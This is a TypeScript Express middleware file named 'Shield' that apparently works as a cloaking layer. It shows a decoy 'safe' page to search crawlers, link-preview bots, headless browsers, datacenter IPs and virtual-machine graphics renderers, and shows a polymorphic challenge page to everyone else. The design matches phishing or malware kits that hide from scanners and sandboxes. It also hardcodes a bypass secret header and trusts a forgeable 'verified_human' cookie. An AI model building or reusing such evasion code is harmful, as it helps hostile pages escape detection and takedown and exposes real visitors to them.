import { Request, Response, NextFunction } from 'express';
import path from 'path';
import geoip from 'geoip-lite';
import { isCloudIp } from './ip-ranges';
import { generateChallengePage } from './polymorph';

// Adjust path based on execution context (dist-server vs server)
// In Docker/Prod, views are in ./views relative to this file (if compiled to dist-server/shield.js)
const SAFE_PAGE = path.join(__dirname, 'views', 'safe.html');

// List of known bot User-Agent fragments
const BOT_AGENTS = [
    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'twitterbot',
    'facebookexternalhit', 'rogerbot', 'linkedinbot', 'embedly',
    'quora link preview', 'showyoubot', 'outbrain', 'pinterest',
    'slackbot', 'vkshare', 'w3c_validator', 'redditbot', 'applebot',
    'whatsapp', 'flipboard', 'tumblr', 'bitlybot', 'skypeuripreview',
    'nuzzel', 'discordbot', 'google page speed', 'qwantify',
    'bot', 'spider', 'crawl', 'scraper',
    'headlesschrome', 'phantomjs', 'selenium', 'webdriver', 'playwright'
];

const SUSPICIOUS_RENDERERS = [
    'swiftshader',
    'llvmpipe',
    'vmware',
    'virtualbox',
    'software rasterizer',
    'microsoft basic render',
    'mesa'
];

export const checkBot = (req: Request): boolean => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    if (!ua) return true; // Block empty UA

    // 1. User-Agent Check
    if (BOT_AGENTS.some(bot => ua.includes(bot))) {
        return true;
    }

    // 2. IP Check (GeoIP)
    const ip = req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress || '';

    // Allow local/private IPs
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('::ffff:127.0.0.1')) {
        return false;
    }

    // 3. Cloud/Datacenter Check
    if (isCloudIp(ip)) {
        // console.log(`[Shield] Blocked Cloud IP: ${ip}`);
        return true;
    }

    const geo = geoip.lookup(ip);

    // Strict Mode: Block IPs that don't resolve to a country (often Datacenters/VPNs not in DB)
    if (!geo) {
        // console.log(`[Shield] Blocked IP with no Geo data: ${ip}`);
        return true;
    }

    return false;
};

export const shieldMiddleware = async (req: Request, res: Response, next: NextFunction) => {
    // 0. Test/Admin Bypass
    if (req.headers['x-shield-bypass'] === 'planning_mode_secret') {
        return next();
    }

    // 1. Bypass for Shield API, Health Check, and Socket.IO
    if (req.path === '/api/shield/verify' || req.path === '/api/health' || req.path.includes('/socket.io/')) {
        return next();
    }

    // 2. Cookie Verification (Prioritize verified sessions)
    if (req.cookies && req.cookies['verified_human'] === 'true') {
        return next();
    }

    // 3. Bot Detection
    if (checkBot(req)) {
        console.log(`[Shield] Bot detected: ${req.ip} - ${req.headers['user-agent']}`);
        return res.status(200).sendFile(SAFE_PAGE);
    }

    // 4. Serve Challenge
    res.status(200).send(await generateChallengePage());
};

export const verifyHandler = (req: Request, res: Response) => {
    // Double check Bot
    if (checkBot(req)) {
         return res.status(403).json({ status: 'blocked' });
    }

    const body = req.body;

    // 1. Hardware Check
    if (body.hardware) {
        const concurrency = body.hardware.concurrency;
        if (concurrency && concurrency < 2) {
            console.log(`[Shield] Blocked Low Concurrency: ${concurrency}`);
            return res.status(403).json({ status: 'blocked', reason: 'hardware' });
        }
    }

    // 2. Graphics Check
    if (body.graphics) {
        const renderer = (body.graphics.renderer || '').toLowerCase();
        if (SUSPICIOUS_RENDERERS.some(r => renderer.includes(r))) {
            console.log(`[Shield] Blocked Suspicious Renderer: ${renderer}`);
            return res.status(403).json({ status: 'blocked', reason: 'graphics' });
        }
    }

    // Set Cookie
    res.cookie('verified_human', 'true', {
        httpOnly: true,
        secure: req.secure || req.headers['x-forwarded-proto'] === 'https',
        maxAge: 1000 * 60 * 60 * 24 // 1 day
    });

    res.json({ status: 'ok' });
};
